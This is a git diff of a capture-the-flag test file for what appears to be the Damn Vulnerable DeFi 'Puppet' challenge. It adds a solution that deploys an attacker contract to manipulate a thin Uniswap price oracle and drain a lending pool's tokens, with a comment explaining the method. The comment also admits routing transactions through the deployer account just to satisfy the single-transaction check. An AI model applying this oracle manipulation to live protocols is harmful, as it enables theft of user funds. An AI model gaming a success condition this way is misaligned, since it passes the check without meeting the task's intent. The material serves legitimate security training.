@@ -23,12 +23,12 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
-        
+
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
 
@@ -52,7 +52,7 @@ describe('[Challenge] Puppet', function () {
             token.address,
             uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await token.approve(
             uniswapExchange.address,
@@ -64,7 +64,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await uniswapExchange.getTokenToEthInputPrice(
@@ -78,7 +78,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and player accounts
         await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
         await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -95,13 +95,40 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('PuppetPoolAttacker', deployer)).deploy(
+            token.address,
+            uniswapExchange.address,
+            lendingPool.address,
+            player.address,
+            { value: ethers.utils.parseEther("20") }
+        );
+
+        await token.connect(player).transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await attacker.attack();
+
+        /*
+        Explanation:
+        The Uniswap pool has extremely low liquidity, having a pair with 10 ETH and 10 DVT.
+        We have 1000 DVT.
+        We create an attacker contract that dumps our 1000 DVT into the pool, swapping for ETH.
+        Then we borrow a lot of DVT with our ETH, because the price is low.
+        Then we send to the player.
+
+        Notes:
+        I again lost a lot of time because I forgot receive() external payable {} in my attacker contract
+        and error messages in Ethers are terrible. I should start writing receive() external payable {}
+        every time just to be sure.
+        Also the requirement of 1 transaction is misleading because that`s impossible, we did a total
+        of 3 transactions with 2 of them being from the deployer, which doesn`t make much sense,
+        just to pass the requirement.
+        */
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
         expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
-        
+
         // Player has taken all tokens from the pool       
         expect(
             await token.balanceOf(lendingPool.address)
